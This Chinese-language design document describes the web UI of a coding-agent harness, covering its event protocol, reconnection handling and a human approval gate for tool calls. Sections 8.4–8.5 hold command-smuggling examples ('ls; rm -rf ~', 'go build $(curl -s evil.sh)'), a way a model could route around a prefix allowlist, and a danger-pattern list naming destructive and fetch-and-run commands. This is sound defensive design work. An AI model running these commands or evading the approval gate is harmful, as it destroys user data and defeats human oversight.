# pi-go Web UI 设计

> 状态：**已实现并可用。** 服务端用 curl + 真实模型压实，前端有 17 个单测（含真实 SSE 录制回放）。
> 唯一未做的验证是**人眼过一遍界面**，清单见 §15.2。
> harness 层（循环、工具、协议、会话）的设计见 `harness-design.md`；使用说明见 `../README.md`。
> UI/UX 参考 `../../参考资料/YX代码/前端`（Vue3 + TS + Element Plus）。

---

## 1. 目标与非目标

给 pi-go 加一个浏览器界面，让它的 harness 行为**可见**：模型在想什么、调了哪个工具、工具返回了什么、失败后怎么自己纠正、这一轮花了多少 token。

Web 是第二个事件消费者，不是终端渲染器的替代品。核心循环的形状不变，但**碰了 `loop.go` 两处**：工具结果结构化（§5.1）和审批闸门插桩（§8.2）。

### 非目标（明确不做）

| 不做 | 原因 |
|---|---|
| **规划模式 / plan mode** | pi-go 是扁平 ReAct 循环，没有分诊、规划、子任务、重评估。YX 的 `plan_mode`、`subtasks`、执行波次全部不移植 |
| SQL 编辑器 / 图表 / 关系图 | YX 的领域产物（SQL 分析 agent），pi-go 的产物是文件改动和命令输出 |
| MCP | 仍在不做清单上 |
| ~~todos~~ | **已实现**，见 §10.12。当初列进非目标是因为它被读成 plan mode 的一部分；实际落地的是一个纯函数工具，不持有状态、不做调度，与规划模式无关 |
| 上下文压缩（compaction） | 同上。但**要有撞墙预警**，见 §10.8 |
| **`-p` 的 Web 等价物** | 不做「提交任务 → 轮询」那套。`-p` 留给 subagent，见 §12 |

---

## 2. 实现状态

分五个阶段做的，前四个已完成：

| 阶段 | 内容 | 状态 |
|---|---|---|
| W1 | 数据地基：`Tool` 返回 `Result{Text, Details}`、移植 diff 生成、会话列表 | ✅ |
| W2 | loop 改造：`ToolGate` 钩子、并行执行、per-path 锁 | ✅ |
| W3 | `web/`：Manager + Hub + Runner + SSE + control + WebGate | ✅ |
| W4 | 前端：`web/ui/`，timeline + 四个工具渲染器 + DiffView + GateCard | ✅ |
| W5 | 打磨：ContextMeter + ModelPicker + 语法高亮 + 会话重命名/置顶 | ✅ |
| M1–M5 | workspace 文件面板：只读 API → 树/预览 → 会话改动 tab → journal + 工作区累积 diff → 面板内编辑 + quick open（§16） | ✅ |
| — | 会话内 pty 终端（§17） | ✅ |
| — | 撤回 + 影子仓 checkpoint（§18） | ✅ |
| — | 剩下的见 §15.1，没有一项是阻塞性的 | ◐ |

### 2.1 已用 curl + 真实模型验证的（W3 的支柱）

| 验收项 | 结果 |
|---|---|
| **run 存活** | 跑 `sleep 20`，第 10 秒左右 kill 掉订阅的 curl → 重连拿到完整快照，`details.duration_ms` 是 **20009**，命令跑满全程 |
| **断连重连** | 不带 `from` 重连 → 单帧 `snapshot`，内容完整；带 `?from=26` → 只回放 5 条语义事件，中间十几条 token delta 正确地不在日志里 |
| **闸门超时后 loop 继续** | `gate_request`（带 `danger:["rm -rf"]` 和绝对 deadline）→ 不回应 → `gate_resolved{by:"timeout"}` → `tool_end{is_error:true}` → **turn 2** → `run_end{end_turn}`。模型自己回了「命令未被执行：你在 25 秒内没有批准这次调用」 |
| **闸门跨重连** | 待决时断开重连 → 快照里 `pending_gates` 的 `gate_id` 与 `deadline` 与原事件逐字相同，本地算出剩余 2.8s |
| 409 三处 | 重复发起 / 运行中删除 / 运行中切模型 |
| cancel | 杀掉整个 bash 进程组（不是只断连接） |
| 鉴权 | 401（含 SSE）、403 跨域、非 loopback 警告、静态资源免 token |
| dev 代理 | `-web-dev` 下 vite 的 dev HTML 与 `/src/main.ts` 穿透，`/api` 仍由 Go 处理 |

### 2.2 测试

```bash
go test -race -count=1 ./...            # 502 个用例（web 包 84 个）
cd web/ui && npm test && npm run check  # 141 个用例（12 个文件）+ vue-tsc
```

前端测试分三类，第二类是关键：

- `timeline.test.ts`（51）：纯函数行为——轮次编号、运行态、闸门归位、孤儿闸门、纠错关联、SSE 帧解析、subagent frame 投影
- 另外九个纯逻辑文件：`argsPreview`（17）、`highlight`（13）、`ansi`（11）、`fileTreeStore`（9）、`fileIcons`（7）、`changes`（6）、`fuzzy`（4）、`contextEstimate`（4）、`outage`（4）、`patch`（3）
- `replay.test.ts`（12）：**回放一段真实运行的 SSE 录制**（`__fixtures__/real-run.sse`：真模型、真 edit 改文件、真闸门弹卡并批准、真 bash），断言最终时间线里有 diff、bash exit 0、无残留运行态；还模拟一次中途重连，断言快照重放后状态与不中断的重放一致

手写事件只能证明客户端符合**我对协议的想象**，录制才能证明它符合**服务端的实际行为**。§6.3 那条顺序约束就是这么发现的。

---

## 3. 从 YX 借什么

### 借了

| 借什么 | 出处 | 说明 |
|---|---|---|
| **fetch + ReadableStream 的 SSE 客户端** | `api/agent-qa.ts:434` | 不用 `EventSource`：请求要带 `Authorization` 头，而 EventSource 设不了头（它给的理由是 POST body，同样成立） |
| **优雅取消走独立 control 通道** | `index.vue:1101` | 优先 `POST /control {action:"cancel"}` 而非 `abort()`。pi-go 的 bash 会 fork 子进程，断连接不等于杀进程 |
| **`call_id` 作为工具调用一等标识** | 全局 | 串起 tool_start / tool_end / 等待态 / 闸门。并行批次乱序完成因此不需要特殊处理 |
| **大结构化产物走专用字段** | `expand_graph` 事件 | pi-go 对应的是 diff，见 §6.4 |
| **纯函数把事件状态映射成视图** | `trace.ts:164 buildTrace()` | 无 Vue 依赖、可离线单测。`timeline.ts` 照这个模式写 |
| 审批卡的超时冻结/恢复双向协商 | `ConfirmCard.vue` | 整套借鉴，改了两处，见 §8.6 |
| Element Plus + SCSS + markdown-it | 全局 | 同栈，降低接入成本 |

### 没借

- **`Turn` 数据模型**：它是为 plan-execute 图设计的（`subtasks` + `steps: Record<subtask_id, Step[]>` + `phases`），pi-go 照搬会得到一堆永远空的字段和走不到的波次代码。改成镜像 pi-go 自己的 `llm.Block`，见 §10.2
- **`TraceTree` 递归树**：pi-go 只有两层（轮次 → 工具调用），树形结构在这里是多余的抽象
- **`CodeBlock` 的手写 tokenizer**（441 行）：它的 JSON/SQL 分支对 pi-go 没意义，需要的是 Go/TS/shell。语法高亮推到 W5
- **`SqlEditor` / `AnswerChart` / `ExpandGraphCard` / `ContextPanel`**：全是 SQL 分析领域的

### 它的三个已知问题也没继承

1. **4723 行单文件**（其中 2000 行 `<style scoped>`），零 composable → 这边拆成 12 个文件，最大的 `AgentView.vue` 571 行含 250 行样式
2. **滚动跟随没有用户意图判定**（往上翻历史会被强行拉回底部）→ 这边距底 > 80px 就停止跟随，回到底部恢复
3. **每 token 全量重算**（`parseAnswerBlocks` + `md.render` + `buildTrace` 都在模板里内联调用）→ 这边 `liveVersion` 80ms 节流 + markdown 只在定稿后渲染一次
4. **客户端断连即杀运行**（`bridge.py` 的 `finally` 里 `task.cancel()`）→ 这是本方案要解决的核心问题，见 §7

---

## 4. 整体架构

```
┌─ 浏览器 (Vue3 + TS) ────────────────────────────────────┐
│  POST /api/sessions/{sid}/messages   发起一轮            │
│  GET  /api/sessions/{sid}/stream     订阅事件 (SSE)      │
│  POST /api/sessions/{sid}/control    取消 / 审批 / 策略    │
└───────────────────────┬─────────────────────────────────┘
                        │
┌─ web/ ────────────────┴─────────────────────────────────┐
│  server.go   HTTP 路由、鉴权、静态资源                     │
│  ui.go       embed.FS + SPA 回退                         │
│  wire.go     agent.Event → SSE 帧的 DTO（18 种事件）       │
│  hub.go   ★  每会话事件日志 + 订阅者扇出 + 快照 + 派生状态   │
│  runner.go ★ 后台跑 agent.Run，寿命属于 session 不属于连接  │
│  manager.go  会话注册表、并发控制、TTL 回收                │
│  gate.go  ★  WebGate：实现 agent.ToolGate                │
│  policy.go   放行策略、危险模式高亮                        │
│  ui/         Vue 源码，构建产物 embed 进二进制             │
└───────────────────────┬─────────────────────────────────┘
                        │
┌─ harness ─────────────┴─────────────────────────────────┐
│  agent.Agent ── llm.Client ── tools.Registry ── session.Store │
└─────────────────────────────────────────────────────────┘
```

**单文件分发**：前端构建产物用 `embed.FS` 打进二进制，`pi-go -web` 直接起服务。这是 Go 的主要优势，不丢掉。开发期用 `-web-dev http://localhost:5173` 反代到 vite。

**关键决策：run 的寿命属于 session，不属于 HTTP 连接。**

`Runner` 在后台 goroutine 里消费 `<-chan agent.Event`，转成 wire event 发给 `Hub`；`Hub` 落进事件日志并扇出给所有订阅者。SSE handler 只是订阅者，它死掉不影响 run。

这是与 YX 相反的选择，所以僵尸问题必须自己解决，见 §7.5。

---

## 5. Go 侧的地基

### 5.1 `Tool` 返回 `Result{Text, Details}`

详见 `harness-design.md` §5。这里只强调对界面的意义：**`EditDetails.Diff` 就是 DiffView 的数据源**，而它不进 LLM 上下文——diff 给模型看是浪费 token（那是它刚写的），给人看才有价值。

对比 pi：它的 `edit` 除文本外还返回 `details: {diff, patch, firstChangedLine}`（`edit.ts:118`）。pi-go 当初为了极简把 diff 生成整个丢掉了，只回一句 `Successfully replaced 1 block(s)`。W1 把它补回来了（含零依赖的 `diff` 包）。

### 5.2 会话并发安全

`agent.Agent` **不是并发安全的**：

- `a.messages` 在 goroutine 里 append，`Run()` 被并发调用就是 data race
- `SetClient()`（切模型）直接改字段，无同步
- `tools.Default(cwd)` 把工作目录烧进 registry，路径守卫是 per-registry 的 → **每会话要有独立 registry**

`manager.go` 因此保证：`map[sessionID]*Session`，每个 Session 至多一个活跃 Runner，**同一会话同时只允许一个 run**（重复发起返回 409）。跨会话并行不受限。切模型在运行中返回 409，因为 `SetClient` 写的字段被 loop 每轮读。

### 5.3 事件 DTO

`agent.Event.Err` 是 `error`，不能 JSON 序列化。`web/wire.go` 做转换，并引入 run 内单调递增的 `message_id`。不改 `agent.Event` 本身。

**`message_id` 由 Hub 在 `turn_start` 时铸造**（一轮 = 一条 assistant 消息），`token` / `thinking` / `message` 事件由 Hub 在发布时填入。让发布方维护这个编号会让 Runner 和 Hub 各存一份同样的状态。

---

## 6. 事件协议

### 6.1 帧格式

```
id: 42
event: tool_start
data: {"seq":42,"ts":1785672346123,"call_id":"tool_abc","name":"edit","args":{...}}

```

`id:` 是会话内单调递增的 `seq`，供 §7.3 的手动重连定位。DTO 是**扁平 union**（`web.Event`，所有字段 `omitempty`）而不是嵌套的 `data` 对象：代价是结构体很宽，收益是每个字段的名字和类型都只在一处定义，消费者不用猜 payload 形状。

### 6.2 事件清单（18 种）

| SSE event | payload 要点 | 说明 |
|---|---|---|
| `snapshot` | `{seq, messages, results, live, run, policy, usage, context_tokens, overhead_tokens}` | **不带 `?from=` 时的第一帧**，见 §7.3 |
| `run_start` | `{run_id, model, provider}` | |
| `user_message` | `{message_id, text}` | 用户的提问。多标签页时 B 页要看到 A 页提交的问题出现。**跑动中的插话也走这个类型**（由 loop 在真正送达的那一刻发出，见 §7.7），所以前端不需要第二套渲染 |
| `turn_start` | `{turn, message_id}` | loop 的第 N 轮，UI 用它划分轮次 |
| `thinking` / `token` | `{message_id, text}` | 增量，**不入日志**，见 §7.4 |
| `message` | `{message_id, role, content:[Block], usage}` | 定稿的 assistant 消息，客户端用它替换累积的增量文本（纠偏）。`usage` 是**这一轮自己的**，不是累计——见 §10.8 |
| `tool_start` | `{call_id, name, args}` | 闸门之后发出，所以带的是**实际执行的参数**（含改写后的） |
| `tool_partial` | `{call_id, name, text}` | 还在运行的调用打印的输出，`text` 是**增量**。与 token delta 同一条规则：**不进重放日志**，折进 `PendingTool.Output`（上限 32KB，保留尾部）。可以整体忽略 —— settled 输出总会随 `tool_end` 到达，所以漏掉每一个片段也不会算错。目前只有 `bash` 会发 |
| `tool_end` | `{call_id, name, text, is_error, details}` | `details` 见 §6.4。到达后 `PendingTool` 连同它的 live 输出一起消失，settled 结果接手 —— 两者不会同时渲染 |
| `gate_request` | `{gate_id, call_id, tool, args, deadline, danger[]}` | 弹审批卡 |
| `gate_deadline` | `{gate_id, deadline}` | 取消改写后恢复计时的新绝对时间 |
| `gate_resolved` | `{gate_id, allow, reason, by}` | `by` = `user` / `timeout` / `cancel` |
| `gate_auto` | `{call_id, tool, rule}` | 自动放行的审计记录，不弹卡。`rule` = `policy:auto` / `policy:standard` / `session:tool:<name>` / `session:command` |
| `policy_changed` | `{policy, by}` | 广播给该会话所有订阅者 |
| `policy_reverted` | `{policy, from, to, reason}` | `/auto <n>` 到期自动回退 |
| `model_changed` | `{model, provider, context_window}` | 热切换要广播；窗口变了仪表要跟着重算 |
| `retry` | `{attempt, max, delay_ms, reason}` | 来自 `llm.OnRetry` 钩子 |
| `run_end` | `{stop_reason, usage, error, undelivered[]}` | `undelivered` 是接受了但没送达的插话，见 §7.7 |
| `error` | `{error}` | |

YX 剩下的 11 种（`route`/`plan`/`replan`/`task_update`/`sources`/`clarify`/`skill_hit`/`result_table`/`expand_graph`/`feedback`/`cancelled`）都是它的领域事件，**一个都不补**。`cancelled` 不单独发，取消体现在 `run_end.stop_reason`。

`skill_hit` 原本写的是「唯一将来会补的」，实现 skills 时决定不补：加载一个 skill 就是一次 `read`，`tool_end` 已经把这件事放上时间线了，再发一个事件是把同一个事实说两遍，还要给日志和快照结构加字段。前端改成在 read 卡片上打一个 skill 徽标，数据源是 `tool_use.input.path`（见 §10.11）。

### 6.3 一条顺序约束：gate 事件可能先于它引用的 message

录真实运行时发现的**协议事实**：

```
turn_start → gate_request → message（里面才有这个 call_id 的 tool_use）
```

原因是闸门**自己发事件**（§8.2 的设计：loop 只消费裁决，`ToolGate` 不知道 UI 存在），而 `message` 走 loop 的事件 channel 由 Runner 转发。两条路径在 Hub 锁上竞争，而 loop 发完 message 就立刻进闸门，所以反序**稳定复现**。

**快照永远自洽**（它是派生状态），只有实时流在这两条路径之间无序。

三种处理办法里选了最简单可靠的：**前端渲染 call_id 未知的待决闸门**（`timeline.ts` 的 `adoptOrphanGates`）。另两种（服务端加屏障、Hub 里缓存重排）都要动并发代码，而且客户端**无论如何**都得容错——日志截断后重连会遇到同样情形。

### 6.4 为什么 `details` 单独走而不是塞进 `text`

`tool_end.text` 是**回给模型的那份**，已被截断到 2000 行 / 50KB。`details.diff` 是**给人看的那份**，不受截断限制，也不进 LLM 上下文。

这就是 YX 用 `expand_graph` 绕开 observation 600 字符截断的同一个道理，只是产物换成了 diff。

---

## 7. 断线重连与缓存

### 7.1 问题

刷新浏览器会断，两个独立原因：

1. **run 的寿命绑在连接上** —— YX 的 `bridge.py` 在 `finally` 里 `task.cancel()`，注释是「客户端断连也在此清理，避免僵尸运行」。**所以刷新杀掉 run 是它的设计，不是 bug**
2. **没有任何重放机制** —— 即使 run 活着，新连接也拿不到已经发过的事件

两个都解了。

### 7.2 事件日志 + 订阅者扇出

每个会话一个 `Hub`，它是**唯一的状态机**：快照和实时流都由同一次 fold 产生，所以两者不可能互相矛盾。

`Publish(e)`：加锁 → 分配 `seq` → `apply()` 折叠进派生状态 → 追加日志（只有语义事件）→ 非阻塞扇出给每个订阅者。

**订阅者写满就丢弃它**（关掉 channel），它随后自己带 `?from=<lastSeq>` 重连补齐。日志的存在让「慢消费者」这个经典难题不需要任何策略。

`Subscribe(from)`：**在同一把锁内**完成「快照或日志切片 + 注册 channel」，这样既不漏事件也不重复。

### 7.3 两种重连路径

```
GET /stream            → 快照路径
GET /stream?from=42    → 增量路径
```

**快照路径**（浏览器刷新、新标签页、首次进入）：首帧 `snapshot`，之后从当前 seq 继续推送实时事件。

```json
{
  "seq": 87,
  "messages": [ {"id":"u1","role":"user","content":[{"type":"text","text":"..."}]},
                 {"id":"m2","role":"assistant","content":[{"type":"thinking"},{"type":"tool_use"}]} ],
  "results": { "tool_abc": {"call_id":"...","name":"bash","text":"...","is_error":false,"details":{...}} },
  "live": { "run_id":"a1b2","active":true,"turn":3,"message_id":"m5",
            "thinking":"已累积的思考全文","text":"已累积的回答全文",
            "pending_tools":[{"call_id":"tool_x","name":"bash","args":{},"started_at":0}],
            "pending_gates":[{"gate_id":"g1","call_id":"tool_y","tool":"bash",
                              "deadline":1785672400000,"danger":["rm -rf"]}] },
  "run":    {"active":true,"model":"k3","provider":"kimi"},
  "policy": {"mode":"standard"},
  "usage":  {"input":1817,"output":104,"cache_read":768}
}
```

三个形状上的决定：

**`messages` 里没有 `tool_result`。** 它们被抽进 `results` 边表，按 `call_id` 索引。原因是**从 JSONL 恢复的历史和实时渲染必须同形状**：不抽的话，`-resume` 的会话里 tool_result 内联在 user 消息中，而实时会话里它是 `tool_end` 事件,前端要写两套渲染。`Hub.Seed()` 负责拆分，工具名从发起调用的 assistant 消息里回填（result block 自己不带工具名）。

**`pending_gates` 里的 `deadline` 是绝对时间戳**（epoch ms），客户端本地算剩余——这是刷新后审批卡能显示正确倒计时的前提，见 §8.6。

**`policy` 必须在快照里**，否则刷新后 PolicyPicker 会显示成默认模式，而闸门实际还是关着的。

**增量路径**（网络抖动，客户端本地状态还在）：回放 `seq > from` 的日志条目，然后转实时。日志已经放不下那么远时**自动降级成快照**（`canReplay`）。

前端策略：**页面刷新一律走快照路径**（本地无状态，快照总是对的）；只有 SSE 读流中途异常而页面没重载时才带 `from` 重连，退避 500ms → 5s。

**一个必须知道的推论：快照不重放 `run_end`。** run 已经结束时重连，只会拿到 `snapshot.run.active == false`。任何「等运行结束」的逻辑必须同时接受这两个信号。

### 7.4 日志的内存边界

日志只存**语义事件**（`turn_start` / `message` / `tool_start` / `tool_end` / `gate_*` / `retry` / `run_end`），一轮几十条。

`thinking` / `token` **不逐条入日志**，只累加进 `live`。它们仍然实时扇出给在线订阅者（打字效果不丢），重连时以 `live` 里的全文形式一次给出。

**这是个明确的取舍：快照不重放逐 token 的打字过程。** 刷新后的浏览器要的是当前状态，不是打字动画。代价是重连的人看不到那段动画，收益是内存与 transcript 成正比而不随 token 数爆炸。

护栏：单会话日志超过 2000 条丢弃最旧的——反正定稿内容在 JSONL 里，快照路径能重建。

### 7.5 僵尸运行的防治

既然不再靠「断连即杀」，得自己兜住：

| 机制 | 说明 |
|---|---|
| **单 run 硬超时** | `context.WithTimeout`，默认 30 分钟 |
| **空闲回收** | 无订阅者且无活跃 run 持续 15 分钟 → 从内存驱逐（状态在 JSONL 里，下次请求透明重建） |
| **显式取消** | `POST /control {action:"cancel"}` → `context.CancelFunc` → 贯穿 HTTP 请求与 bash 的整个进程组 |
| **进程退出** | 优雅关闭时取消所有 run，5 秒后强制关闭连接（SSE handler 不会自己返回） |

`-max-turns`（默认 50）和 bash 的 120 秒超时仍然生效，是第二道防线。

### 7.6 多客户端同会话

多个标签页订阅同一会话都能拿到同一份流，天然支持。**但同一会话同时只允许一个 run**：第二次 `POST /messages` 得到 409。运行中输入框**不再置灰** —— 发送会变成插话，见 §7.7。

策略是服务端状态，靠 `policy_changed` 广播同步。**会话列表目前不跨标签页同步**（只在新建/发送/删除时刷新），这是已知缺口。

### 7.7 跑动中插话（steering）

`POST /control {action:"steer", prompt}` 把一条消息塞进正在跑的那个 run，`{"steered":bool}` 告诉客户端有没有塞进去。在这之前，看着 agent 往错方向跑只有两个选择：取消掉整轮，或者干等。

**注入点是硬约束而不是偏好**：消息只能落在「上一轮的 tool_result 之后、下一次模型调用之前」。再早一点就插在 tool_use 和它的 tool_result 之间，那样的请求会被 API 拒绝，而且会话从此不可恢复。所以事件由 loop 在真正送达的那一刻发出（`agent.EventSteer` → 线上的 `user_message`），而不是由 HTTP handler 在收到时发出 —— 时间线要显示它进入对话的位置，不是它被打字的时刻。

**`steered:false` 不是错误。** 它意味着 run 在点击和请求之间结束了，客户端的下一步是当普通消息发出去。用状态码表达会把一个正常竞态渲染成失败。`Steer` 返回布尔而不是让客户端先查 `run.active` 也是为此：先查后发是 TOCTOU，答案必须来自接受消息的那把锁。

**模型本来要停时，队列非空就继续。** 这顺手拿到了 pi 的 `getFollowUpMessages`，而且堵住一个真实的洞：用户往往是看着答案快写完了才打字，那条消息恰恰最需要送达。

**接受了但送不出去的窗口关不掉。** 消息可以在 loop 撞上 `maxTurns`、遇到传输错误或被取消的前一刻被接受。所以 `run_end` 带 `undelivered[]`，前端把文本放回输入框并说明原因 —— 默默丢掉用户打的字比拒绝更差，因为拒绝至少是可见的。

终端模式没有插话：REPL 在跑的时候是阻塞的，用户根本没法打字。`-p` 也永远不该有，它要留给 subagent，那里没有人。

---

## 8. 安全与审批闸门

### 8.1 传输层基线

**pi-go 的 `bash` 工具没有路径限制**（`read`/`write`/`edit` 有，bash 没有）。CLI 场景下这没问题——用户本来就在 shell 前面坐着。**Web 服务不一样：暴露出去等于提供一个 RCE 即服务。**

| 措施 | 说明 |
|---|---|
| **默认只绑 `127.0.0.1`** | 绑到外部地址会额外打印警告 |
| **token 永远必需** | 没有关闭开关。未设 `PIGO_WEB_TOKEN` 就随机生成一个并打印（照 jupyter 的做法）。原设计是「绑 0.0.0.0 时才强制」，收紧了：**「无鉴权版本」这个形态一旦被谁跑起来就收不回来** |
| **鉴权范围是 `/api/*`** | 页面和 bundle 不需要 token，见下 |
| **同源限制** | 校验 `Origin`，不开 CORS。`-web-dev` 时额外接受 vite 的 origin |
| **工作目录固定** | 启动时 `-C` 指定一个根，会话不能换目录 |
| 服务端镜像 | 事件同时可在终端看见，能肉眼确认 agent 在干什么 |

**为什么静态资源不能要 token**：浏览器**没法给它从 HTML 里发现的 `<script src>` / `<link href>` 加请求头**。页面用 `?token=` 打开没问题，但随后请求 `/assets/index-xxx.js` 时不带任何凭据 → 401 → 白屏。

所以划分是 **`/api/*` 一律需要，页面和 bundle 不需要**。这不降低安全性：bundle 就是二进制里那份代码，没有秘密；所有能做事的入口仍然要 token。

> 这条规则**双向脆弱**：往严格改一次就白屏，往宽松改一次就把 API 放开了。`TestStaticAssetsLoadWithoutATokenButTheAPIDoesNot` 守着两个方向。
>
> 前端从 URL 取 token 存进 sessionStorage，所以同一标签页刷新没问题；开新标签页要重新用带 token 的地址打开。

### 8.2 闸门在架构里的位置

pi 的做法是 `AgentLoopConfig.beforeToolCall`（`agent-loop.ts:508`）：返回 `{block: true, reason}` 时**不是抛异常**，而是变成一条 `is_error` 的 tool result，loop 继续跑。

这一点照搬了，因为它和 pi-go 已有的错误自纠正是同一个设计：**拒绝是给模型的信息，不是运行的终止。** 模型看到「这条命令被用户拒绝了，原因是 X」之后可以解释、换方案、或者问你。如果拒绝会杀掉整轮，用户点一次「拒绝」就得从头再来。

```go
// 实现必须并发安全：并行批次会有多个 goroutine 同时进入 Review。
type ToolGate interface {
    Review(ctx context.Context, req GateRequest) GateDecision
}

type GateDecision struct {
    Allow bool
    // Reason 在 Allow=false 时作为 is_error 的 tool result 文本回给模型。
    Reason string
    // Args 非 nil 时替换原参数：这是「改写后批准」路径。
    Args json.RawMessage
}
```

CLI 传 nil（行为完全不变，这是 `-p` 保持可脚本化和能当 subagent 的前提）。`WebGate` 是唯一实现。

三条契约：

1. **必须并发安全。** 想要「同时只弹一张卡」应该在实现内部串行（一把 mutex），**不要**因此把整批改成串行执行
2. **可以长时间阻塞等人，但必须尊重 `ctx`**
3. **拒绝是信息不是终止**

闸门插在 `tool_start` 事件**之前**，所以事件里带的是**实际执行的参数**（含改写后的）。「等待审批」这个状态由 `WebGate` 自己发事件给前端（这带来 §6.3 的顺序约束），loop 只消费裁决结果。

### 8.3 策略：哪些调用需要人工过目

全部都问 = 不可用（模型一轮就调好几次 `read`）。全部不问 = 闸门没意义。分级：

| 工具 | `strict` | `standard`（默认） | `auto` |
|---|---|---|---|
| `read` | 放行 | 放行 | 放行 |
| `write` | 询问 | 放行 | 放行 |
| `edit` | 询问 | 放行 | 放行 |
| `bash` | 询问 | **询问** | 放行 |

`standard` 下 `write`/`edit` 放行的依据是：路径守卫已经把它们限制在工作目录内，而且改动**可见且可回滚**——diff 就在界面上，工作目录通常在 git 里。`bash` 没有这两个性质，所以它是默认唯一需要过目的工具。

### 8.4 关键设计：不做命令前缀白名单

这条与直觉相反，需要解释。「自动放行 `ls` / `cat` / `go build` 这些安全命令」听起来很合理，**但按前缀匹配 shell 命令不是安全边界**：

- `ls; rm -rf ~` 以 `ls` 开头
- `go build $(curl -s evil.sh)` 以 `go build` 开头
- 就算把 shell 语法完整解析对了，模型也可以用 `write` 写一个脚本，再用白名单里的解释器执行它

危险不在于这些绕过手法有多难，而在于**白名单会让人以为它挡住了什么**。所以不做。

取而代之的是两个精确、可审计的机制：

**「本会话始终允许这条完全相同的命令」** —— 按命令文本**精确字符串**匹配，会话级作用域。这解决了真实的疲劳场景（一个会话跑 20 次 `go build ./...`），而且精确匹配没有解析可以被绕过。`TestExactCommandGrantDoesNotGeneralise` 守着。

**「本会话始终允许 bash」** —— 逃生舱，界面上明确标注「等同于对它关闭闸门」，不伪装成温和的选项。

### 8.5 危险模式：高亮，不拦截

一份模式表用于在审批卡上**红色高亮**，让人不至于手快点过去：

```
rm -rf   sudo   dd   mkfs   chmod 777   chown   curl|sh   wget|sh
| sh   | bash   > /dev/   :(){   shutdown   reboot   truncate -s 0
git push --force   git reset --hard   git clean -fd   npm publish
docker rm   kubectl delete
```

**这是给人看的提示，不是防护。** 它不拦截、不影响策略判定。把它当防护会重犯 §8.4 的错误。

命中时唯一的行为效果：该次批准**不允许**被记入「始终允许」（前端禁用勾选框，服务端也强制），防止一次手快永久放开。

### 8.6 超时协商

YX 这块设计得最讲究：`rewrite_begin` 冻结服务端超时计时，`rewrite_cancel` 按返回的 `remaining` 秒恢复。原因是改命令要花时间，不能改到一半被判超时。整套借鉴，改两处：

**改一：下发绝对 `deadline`（epoch ms），不下发秒数。** YX 下发秒数、前端自己起倒计时，刷新一次就对不上。绝对时间戳让客户端本地算剩余，**这是快照重连能正确恢复审批卡的前提**。

**改二：显式 `gate_resolved` 事件，不靠文本匹配。** YX 判定失效是在 observation 文本里找「用户未确认或确认超时」这句话（`index.vue:1131`），字符串一改就失灵。

**超时的默认动作是拒绝**，不是放行——无人值守的闸门必须 fail closed。拒绝理由回给模型，loop 继续。

超时时长可调：`-gate-timeout`（默认 5 分钟）。

### 8.7 闸门的 Go 实现

```go
func (g *WebGate) Review(ctx context.Context, req agent.GateRequest) agent.GateDecision {
    if rule, auto := g.policy.Decide(req); auto {
        g.hub.Publish(evGateAuto{req, rule})   // 自动放行也留痕，但不弹卡
        return agent.Allow
    }

    // serial 保证同时只有一张卡：并行批次在这里排队，批准后再并行执行。
    g.serial.Lock()
    defer g.serial.Unlock()

    p := g.open()                 // 注册 pending，返回 decide/freeze/thaw 三个 channel
    defer g.close(p.id)

    deadline := time.Now().Add(g.timeout)
    g.hub.Publish(evGateRequest{p.id, req, deadline, Danger(req)})

    // 一个可重置的 timer。不要在 for 里 defer t.Stop()——那会累积 defer 直到函数返回。
    timer := time.NewTimer(time.Until(deadline))
    defer timer.Stop()
    var frozen bool
    var remaining time.Duration
    for {
        select {
        case v := <-p.decide:
            // 命中危险模式的批准不能记入「始终允许」。
            if v.Allow && v.Remember != "" && len(danger) == 0 { g.remember(v.Remember, req) }
            g.hub.Publish(evGateResolved{p.id, v, "user"})
            return decisionOf(v)

        case <-p.freeze:                        // 用户开始改写参数
            if !frozen { frozen, remaining = true, time.Until(deadline); timer.Stop() }

        case <-p.thaw:                          // 用户取消改写
            if frozen {
                frozen = false
                deadline = time.Now().Add(remaining)
                timer.Reset(remaining)
                g.hub.Publish(evGateDeadline{p.id, deadline})
            }

        case <-timer.C:
            return agent.Deny("用户未在 " + g.timeout.String() + " 内批准这次调用")

        case <-ctx.Done():
            return agent.Deny("运行已取消")
        }
    }
}
```

`Review` 在 Runner 的 goroutine 里阻塞等人，**但 Hub 和 SSE 完全不受影响**——这是「run 的寿命属于 session」带来的直接好处。浏览器可以关掉、刷新、换个标签页回来，审批卡还在那儿等着。

### 8.8 审批卡的界面

`GateCard.vue`，参考 YX 的 `ConfirmCard.vue` 但换掉内容：

```
┌ 需要你确认 ─────────────────────── 剩余 47s ─┐
│ bash                                          │
│ ┌───────────────────────────────────────────┐ │
│ │ rm -rf ./build && go build ./...          │ │
│ └───────────────────────────────────────────┘ │
│ ⚠ 命中危险模式：rm -rf （只是提示，不是拦截）   │
│                                               │
│ [批准]  [改写]  [拒绝]                        │
│ □ 本会话始终允许这条完全相同的命令  ← 命中危险 │
│                                    模式时禁用 │
└───────────────────────────────────────────────┘
```

- 「改写」→ `gate_freeze` → 变成可编辑文本框（bash 是等宽单行框；其他工具是 JSON 编辑）→ 提交走 `gate_decide{allow:true, args:{...}}`；取消走 `gate_thaw`
- 倒计时是纯展示（从绝对 `deadline` 本地算），**服务端计时为准**
- 历史回放里残留的未决卡显示为「已失效」（`live` prop 判定）
- `auto` 模式不弹卡；状态由输入区 PolicyPicker 的橙色「完全访问」按钮承担

### 8.9 全自动模式与斜杠命令

| 命令 | 作用 |
|---|---|
| `/auto` | 全自动，**直到显式关闭** |
| **`/auto <n>`** | 全自动**仅 n 轮**，之后自动回到 `standard` |
| `/auto off` | 回到 `standard` |
| `/strict` / `/standard` | 另两档 |
| `/model [name]` `/usage` `/help` | 与 CLI REPL 对齐（web 侧没有 `/models`——模型列表就是 ModelPicker，服务端兜底清单同步不含它） |

**命令可以缩写**：输入框打出 `/` 开头的前缀时，上方浮出匹配的命令行（复用 skill 补全的样式，第一行标 ⏎），回车直接执行**第一个列出来的**——顺序就是上表顺序（`/s` → `/strict`，`/u` → `/usage`）。光一个 `/` 不匹配任何东西，避免一次误触回车就开全自动。`/skill:` 不是命令而是 prompt（服务端展开，进 transcript），前缀匹配和命令提示都刻意绕开它。

`/auto <n>` 是推荐用法，也大概率是真实需求（「让它自己把这个任务跑完」）。它把「我现在不想被打断」和「我永久放开了闸门」分开了：前者有边界，后者没有。

